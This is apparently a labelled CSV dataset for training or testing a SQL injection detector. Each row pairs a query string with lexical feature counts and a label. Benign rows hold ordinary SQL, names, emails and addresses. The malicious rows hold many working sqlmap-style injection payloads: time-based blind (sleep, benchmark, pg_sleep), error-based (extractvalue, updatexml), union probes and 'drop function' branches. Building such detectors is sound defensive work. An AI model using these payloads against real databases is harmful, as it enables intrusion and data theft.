Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
"calle profesor angel lacalle, s/n,",0,0,0,0,0,0,0,0,34,4,0,27,0,0,0,2,0,0,0
FROM  ( SELECT DISTINCT magnet FROM stone ) ,0,0,0,0,0,0,0,0,44,9,0,11,2,0,0,0,0,0,0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",0,1,0,0,0,0,1,0,51,24,10,11,4,0,0,1,0,0,1
gina,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1,1,3,0,0,0,1,0,52,15,16,13,2,0,0,1,0,0,1
SELECT * FROM farm WHERE herself  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,51,10,4,11,0,0,0,0,0,0,0
en8og1da,0,0,0,0,0,0,0,0,8,0,2,6,0,0,0,0,0,0,0
"  SELECT wealthID AS ID, particularly AS brown FROM break",0,0,0,0,0,0,0,0,57,10,0,28,0,0,0,1,0,0,0
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,1,0,251,108,27,72,25,2,0,4,0,0,1
cinthia,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"1""  )   where 9621  =  9621",0,0,0,0,0,0,1,0,27,10,9,5,1,0,0,0,0,1,1
"  SELECT aroundID AS ID, appearance AS aid FROM child",0,0,0,0,0,0,0,0,53,10,0,24,0,0,0,1,0,0,0
giralda,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT pride ( s ) FROM enjoy INNER JOIN,0,0,0,0,0,0,0,0,40,8,0,11,2,0,0,0,0,0,0
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,2,0,0,0,2,0,294,109,43,107,20,0,2,5,0,1,1
DELETE FROM favorite WHERE tobacco = 'standard',0,0,0,0,0,0,1,0,47,6,0,23,0,0,0,0,2,0,0
caine@albeiteria.es,0,0,0,0,0,1,0,0,19,0,0,17,0,0,0,0,0,0,0
mayolas,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"-1204'   )    )    union all select 3585,3585--",1,0,3,0,1,0,0,0,47,14,12,14,2,0,0,1,1,0,1
fauno,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,2,0,1,0,2,0,103,24,5,62,0,0,0,1,3,0,1
"  UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0,0,0,0,0,0,3,0,75,17,0,35,0,0,0,1,4,0,0
"   SELECT COUNT ( useful ) , express FROM merely BY tobacco",0,0,0,0,0,0,0,0,59,13,0,26,2,0,0,1,0,0,0
7395,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
4644,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,2,0,0,0,2,0,161,57,43,41,10,0,3,5,1,0,1
1 where 9774  =  9774,0,0,0,0,0,0,1,0,21,6,9,5,0,0,0,0,0,0,1
SELECT * FROM pride WHERE NOT directly = 'thousand'  AND NOT instant = 'spread',0,0,0,0,0,0,2,0,79,14,0,34,0,0,0,0,4,0,0
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",0,0,1,0,1,0,1,0,77,16,28,25,1,0,0,3,1,0,1
SELECT AVG ( environment ) FROM pole SELECT SUM ( list ) ,0,0,0,0,0,0,0,0,57,12,0,19,4,0,0,0,0,0,0
SELECT * FROM industry,0,0,0,0,0,0,0,0,22,3,0,8,0,0,0,0,0,0,0
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1,0,3,0,1,0,0,0,69,4,40,14,0,0,0,8,0,0,1
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1,0,2,0,0,0,1,0,92,37,14,31,6,0,0,0,0,0,1
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,0,1,0,0,0,0,1,0,63,28,10,18,4,0,0,0,1,0,1
"  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  ",0,0,0,0,0,0,0,0,76,16,0,32,2,0,0,2,6,0,0
"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,2,0,275,112,35,83,24,2,0,4,0,1,1
-4882' order by 1#,0,0,1,0,0,0,0,0,18,3,5,7,0,0,0,0,1,0,1
"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,1,0,0,0,1,1,0,75,28,21,16,5,0,1,1,0,1,1
end and   (  'hmtt' like 'hmtt,0,1,0,0,0,0,0,0,30,8,0,18,1,0,0,0,3,0,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",0,3,0,0,0,0,1,0,187,73,16,68,16,2,0,4,3,0,1
"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,2,0,0,0,1,0,132,40,10,62,6,0,0,4,1,0,1
6053,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
burns40,0,0,0,0,0,0,0,0,7,0,2,5,0,0,0,0,0,0,0
"  SELECT richID AS ID, remain AS thumb FROM swimming",0,0,0,0,0,0,0,0,52,10,0,23,0,0,0,1,0,0,0
1'||  (  select 'ilkr' from dual where 9296  =  9296,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
5537,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
SELECT * FROM rush ORDER BY important,0,0,0,0,0,0,0,0,37,6,0,13,0,0,0,0,0,0,0
DELETE FROM catch WHERE could = 'win',0,0,0,0,0,0,1,0,37,6,0,13,0,0,0,0,2,0,0
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",0,0,1,0,1,0,1,0,74,10,36,19,0,0,0,5,1,0,1
"-9629'   )    )     )   union all select 3077,3077,3077,3077#",0,0,1,0,1,0,0,0,61,18,20,14,3,0,0,3,1,0,1
spnola ballado,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
SELECT COUNT ( possible )  FROM once,0,0,0,0,0,0,0,0,36,7,0,12,2,0,0,0,0,0,0
perpi izurrieta,0,0,0,0,0,0,0,0,15,1,0,14,0,0,0,0,0,0,0
SELECT handle ( s ) FROM gold INNER JOIN,0,0,0,0,0,0,0,0,40,8,0,11,2,0,0,0,0,0,0
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,0,2,0,0,0,2,2,0,140,45,8,67,6,0,0,2,0,4,1
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,2,0,0,0,2,0,154,43,17,77,5,0,0,3,0,0,1
"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,0,0,0,1,0,165,60,31,55,12,0,2,4,0,1,1
DELETE FROM shallow WHERE develop = 'listen',0,0,0,0,0,0,1,0,44,6,0,20,0,0,0,0,2,0,0
SELECT MIN ( hung )  AS shaking FROM breakfast,0,0,0,0,0,0,0,0,46,9,0,20,2,0,0,0,0,0,0
2a6in6rosa,0,0,0,0,0,0,0,0,10,0,3,7,0,0,0,0,0,0,0
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,0,2,0,1,1,1,0,77,24,3,40,2,0,0,1,0,0,1
SELECT City FROM Suppliers  ORDER BY City;,0,0,0,0,0,0,0,1,42,7,0,14,0,0,0,0,0,0,0
"carretera ribas matama 160,",0,0,0,0,0,0,0,0,27,3,3,20,0,0,0,1,0,0,0
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0,0,0,0,0,0,0,0,73,11,0,30,0,0,0,0,0,0,0
76150645z,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",0,0,1,0,1,0,1,0,94,22,36,25,2,0,0,5,0,1,1
SELECT Count ( * )  AS route,0,0,0,0,0,0,0,0,28,7,0,9,2,0,0,0,0,0,0
niel5,0,0,0,0,0,0,0,0,5,0,1,4,0,0,0,0,0,0,0
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",0,1,0,0,0,0,1,0,115,31,8,65,4,0,0,2,0,0,1
FROM  ( SELECT DISTINCT struggle FROM church ) ,0,0,0,0,0,0,0,0,47,9,0,14,2,0,0,0,0,0,0
"  UPDATE call SET member =  'fifteen', City =  'roar' WHERE first =  spend",0,0,0,0,0,0,3,0,74,17,0,34,0,0,0,1,4,0,0
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,42,8,1,4,0,0,0,0,0,0,0
co85863o,0,0,0,0,0,0,0,0,8,0,5,3,0,0,0,0,0,0,0
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",0,0,6,0,0,0,0,0,87,22,0,38,0,0,0,3,6,0,0
"  SELECT * FROM composed WHERE round IN  ( 'get', 'exact', 'customs' )  ",0,0,0,0,0,0,0,0,72,16,0,28,2,0,0,2,6,0,0
"1""  )   and 4760  =  2922",0,1,0,0,0,0,1,0,25,10,9,3,1,0,0,0,0,1,1
5.97528E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"segura 30,",0,0,0,0,0,0,0,0,10,1,2,6,0,0,0,1,0,0,0
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0,0,0,0,0,0,0,0,65,12,0,23,0,0,0,0,0,4,0
SELECT AVG ( climb ) FROM lovely,0,0,0,0,0,0,0,0,32,6,0,11,2,0,0,0,0,0,0
"-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",0,12,1,0,0,2,3,0,346,148,52,83,30,0,0,1,4,0,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",0,0,0,0,0,0,3,0,218,71,2,55,10,0,0,1,3,0,1
" SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0,0,0,0,0,0,0,0,63,10,0,27,0,0,0,1,0,0,0
8.62453E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT COUNT ( DISTINCT park )  FROM someone,0,0,0,0,0,0,0,0,44,8,0,11,2,0,0,0,0,0,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,0,4,0,0,0,0,2,0,161,59,15,64,8,0,0,0,8,0,1
"   SELECT weather, which, runFROM cowboy WHERE idea  IS NOT NULL",0,0,0,0,0,0,0,0,64,13,0,25,0,0,0,2,0,0,0
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,0,0,0,0,1,0,58,28,10,11,5,0,0,1,1,0,1
dinelli@alcantarapartners.mt,0,0,0,0,0,1,0,0,28,0,0,26,0,0,0,0,0,0,0
" SELECT * FROM along ORDER BY available, so",0,0,0,0,0,0,0,0,43,8,0,16,0,0,0,1,0,0,0
milton@diagnosticoradiologico.asia,0,0,0,0,0,1,0,0,34,0,0,32,0,0,0,0,0,0,0
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1,0,2,1,0,0,1,0,63,18,12,28,2,0,0,0,0,0,1
nassiet.birkin@cienciapolicial.gl,0,0,0,0,0,1,0,0,33,0,0,30,0,0,0,0,0,0,0
"1""  )   where 7548  =  7548",0,0,0,0,0,0,1,0,27,10,9,5,1,0,0,0,0,1,1
"1"" where 2403  =  2403 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,2,0,0,0,2,0,137,37,16,69,4,0,0,2,0,1,1
SELECT say ( s )  FROM camera FULL OUTER JOIN,0,0,0,0,0,0,0,0,45,10,0,10,2,0,0,0,0,0,0
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",0,0,0,0,0,0,0,0,144,54,24,49,12,0,2,4,0,1,1
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,51,9,2,4,0,0,0,0,0,0,0
1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',0,1,2,0,0,0,2,0,109,42,18,34,6,0,0,0,4,0,1
1.00217E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
/,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1
SELECT COUNT ( arrow ) FROM lunch,0,0,0,0,0,0,0,0,33,6,0,10,2,0,0,0,0,0,0
bacio bonnin,0,0,0,0,0,0,0,0,12,1,0,11,0,0,0,0,0,0,0
SELECT * FROM cent WHERE    NOT bound = 'memory',0,0,0,0,0,0,1,0,48,11,0,15,0,0,0,0,2,0,0
SELECT TAN ( 1.75 ) ;,0,0,0,0,0,0,0,1,21,5,3,0,2,0,0,0,0,0,0
SELECT * FROM feature WHERE taste BETWEEN '1996-07-01' AND '1996-07-31',0,0,4,0,0,0,0,0,71,9,16,12,0,0,0,0,4,0,0
SELECT * FROM basic WHERE please BETWEEN '1996-07-01' AND '1996-07-31',0,0,4,0,0,0,0,0,70,9,16,11,0,0,0,0,4,0,0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",0,2,0,0,0,0,2,0,146,69,13,43,12,0,0,1,4,0,1
"1""   )    )    as swwb where 4244  =  4244",0,0,0,0,0,0,1,0,42,18,9,11,2,0,0,0,0,1,1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,0,0,0,0,0,1,0,0,95,49,2,30,10,0,0,0,1,0,1
SELECT * FROM seldom WHERE NOT union = 'drove'  AND NOT window = 'liquid',0,0,0,0,1,0,2,0,73,14,0,28,0,0,0,0,4,0,0
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",0,1,0,0,0,0,1,0,175,74,32,47,14,0,3,4,0,0,1
SELECT CURTIME (  )  + 1;,0,0,1,0,0,0,0,1,25,7,1,0,2,0,0,0,0,0,0
SELECT AVG ( fort ) FROM interior,0,0,0,0,0,0,0,0,33,6,0,12,2,0,0,0,0,0,0
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,0,5,0,0,0,2,2,0,199,84,24,55,18,1,0,3,0,4,1
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,52,10,4,8,0,0,0,0,0,0,0
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,0,2,0,0,0,1,0,186,72,32,60,14,0,2,4,0,1,1
1.86E+15,0,0,1,0,0,0,0,0,8,0,5,0,0,0,0,0,0,0,0
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,0,2,0,0,0,0,2,0,118,61,10,30,10,0,0,0,4,0,1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,2,0,0,0,2,0,101,36,29,26,5,0,1,1,0,0,1
"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1,0,3,0,1,0,1,0,93,16,40,25,1,0,0,6,0,1,1
breceda perdig,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
"  SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0,0,0,0,0,0,1,0,167,18,0,95,0,0,0,2,0,0,0
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",1,1,2,0,0,0,1,0,145,52,35,40,10,0,3,5,0,0,1
SELECT AVG ( ants ) FROM go,0,0,0,0,0,0,0,0,27,6,0,6,2,0,0,0,0,0,0
propaganda,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
"1   )    )    union all select null,null,null,null,null,null#",0,0,0,0,1,0,0,0,61,14,1,38,2,6,0,5,0,0,1
1.13313E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,0,1,1,0,0,0,2,0,58,17,17,18,1,0,0,0,1,0,1
if  (  6745  =  4078  )   select 6745 else drop function ytyt--,1,0,2,1,0,0,1,0,63,18,12,28,2,0,0,0,0,0,1
SELECT * FROM job FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,0,0,41,8,1,3,0,0,0,0,0,0,0
"   SELECT region, difference+ ', ' + mighty+ ' ' + ago+ ', ' + brain AS angle  FROM identity",0,0,6,0,0,0,0,0,92,22,0,43,0,0,0,3,6,0,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",0,1,0,0,0,0,1,0,105,53,1,36,10,0,0,0,0,3,1
38435,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,0,2,1,0,0,0,2,0,78,40,12,13,6,0,0,0,4,0,1
"plaza san miguel 132,",0,0,0,0,0,0,0,0,21,3,3,14,0,0,0,1,0,0,0
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,1,0,0,0,0,2,0,89,30,29,21,4,0,1,1,0,1,1
trastabilln,0,0,0,0,0,0,0,0,11,0,0,11,0,0,0,0,0,0,0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0,0,0,0,0,0,0,0,56,13,0,20,0,0,0,2,0,0,0
SELECT AVG ( pilot ) FROM larger,0,0,0,0,0,0,0,0,32,6,0,11,2,0,0,0,0,0,0
"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",0,0,1,0,1,1,0,0,60,8,28,14,1,0,0,5,1,0,1
"   SELECT consonant, noted, spendFROM in WHERE public  IS NOT NULL",0,0,0,0,0,0,0,0,66,13,0,27,0,0,0,2,0,0,0
"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",1,1,3,0,0,0,2,0,73,24,24,14,3,0,0,1,1,0,1
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,1,1,3,0,0,0,2,0,73,26,24,13,3,0,0,0,1,0,1
SELECT COUNT ( teach ) FROM pleasure,0,0,0,0,0,0,0,0,36,6,0,13,2,0,0,0,0,0,0
"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0,0,0,0,0,0,0,0,66,13,0,27,0,0,0,2,0,0,0
rainmake,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,0,1,0,0,0,0,0,0,127,63,2,45,12,0,0,0,4,0,1
x' or full_name like '%bob%,0,1,0,0,0,2,0,0,27,4,0,18,0,0,0,0,2,0,1
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",0,2,1,0,0,0,1,0,78,26,16,24,4,0,0,1,4,0,1
89816761j,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
1'+  (  select 'upmd' where 3438  =  3438,0,0,1,0,0,0,1,0,41,11,9,15,1,0,0,0,3,0,1
reis,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
"1%""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,0,2,0,0,0,2,2,0,165,65,8,68,10,0,0,2,0,4,1
SELECT * FROM indicate WHERE establish = 'so'  OR gave = 'cheese',0,0,0,0,0,0,2,0,65,12,0,29,0,0,0,0,4,0,0
25330,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0,0,0,0,0,0,1,0,55,9,1,21,0,0,0,0,2,0,0
SELECT * FROM jar WHERE trail = 'structure' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,67,12,1,17,0,0,0,0,2,0,0
"1""  )   as rcnk where 1800  =  1800",0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,0,1,1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_houzez_verification_success' LIMIT 1,0,0,0,0,0,0,1,0,106,11,1,64,0,0,0,0,2,0,0
SELECT * FROM do  WHERE limited = onto,0,0,0,0,0,0,1,0,38,8,0,13,0,0,0,0,0,0,0
SELECT * FROM steep 3 SELECT * FROM dangerous,0,0,0,0,0,0,0,0,45,8,1,14,0,0,0,0,0,0,0
"select * from generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   limit 1--",1,0,2,0,0,0,1,0,110,32,19,48,4,0,0,2,0,0,1
2.28251E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM between,0,0,0,0,0,0,0,0,81,14,3,14,0,0,0,0,0,0,0
end and    (    (     (  'hwrs' like 'hwrs,0,1,0,0,0,0,0,0,42,18,0,18,3,0,0,0,3,0,1
calle laguna de pealara 171 12-e,0,0,1,0,0,0,0,0,32,5,5,21,0,0,0,0,0,0,0
kindra,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
SELECT avoid ( s )  FROM room LEFT JOIN,0,0,0,0,0,0,0,0,39,9,0,10,2,0,0,0,0,0,0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",0,2,0,0,0,0,2,0,262,100,71,59,18,0,3,6,4,0,1
"  SELECT famousID AS ID, principle AS room FROM children",0,0,0,0,0,0,0,0,56,10,0,27,0,0,0,1,0,0,0
SELECT * FROM grow WHERE three LIKE '%require%',0,0,0,0,0,2,0,0,47,7,0,16,0,0,0,0,2,0,0
1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx,1,0,2,0,0,0,1,0,98,41,13,35,6,0,1,0,0,0,1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",0,0,1,0,1,0,0,0,66,18,24,14,3,0,0,4,1,0,1
"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,0,0,0,1,1,0,53,24,10,10,4,0,0,1,1,0,1
"carlos arniches 78,",0,0,0,0,0,0,0,0,19,2,2,14,0,0,0,1,0,0,0
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,1,0,2,1,0,0,1,0,63,18,12,28,2,0,0,0,0,0,1
SELECT * FROM century ORDER BY tobacco DESC,0,0,0,0,0,0,0,0,43,7,0,14,0,0,0,0,0,0,0
"  SELECT * FROM follow WHERE elephant IN  ( 'solve', 'four', 'throat' )  ",0,0,0,0,0,0,0,0,73,16,0,29,2,0,0,2,6,0,0
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,1,0,2,0,0,0,1,0,92,37,14,31,6,0,0,0,0,0,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",0,2,0,0,0,0,1,0,149,37,9,86,4,0,0,3,4,0,1
-5021'+  (  select yadq where 4285  =  4285 order by 1#,0,0,2,0,0,0,1,0,55,14,13,22,1,0,0,0,1,0,1
" SELECT * FROM they ORDER BY ask ASC, mine DESC",0,0,0,0,0,0,0,0,47,10,0,11,0,0,0,1,0,0,0
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,0,0,0,0,0,0,0,0,71,12,0,24,0,0,0,0,0,0,0
"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1,0,3,0,1,0,0,0,61,14,24,14,2,0,0,4,0,0,1
"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",0,1,0,0,0,0,1,0,161,56,39,46,11,0,3,6,1,0,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 12389 )  ORDER BY meta_id ASC",0,0,0,0,0,0,0,0,103,17,5,44,2,0,0,2,0,0,0
SELECT * FROM yourself WHERE favorite NOT LIKE '[farmer]%',0,0,0,0,0,1,0,0,58,8,0,22,2,0,0,0,2,0,0
"1'  )   where 6489  =  6489 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,2,0,0,0,2,0,166,59,47,38,11,0,3,6,1,0,1
8.64151E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
5.9335E+15,0,0,1,0,0,0,0,0,10,0,7,0,0,0,0,0,0,0,0
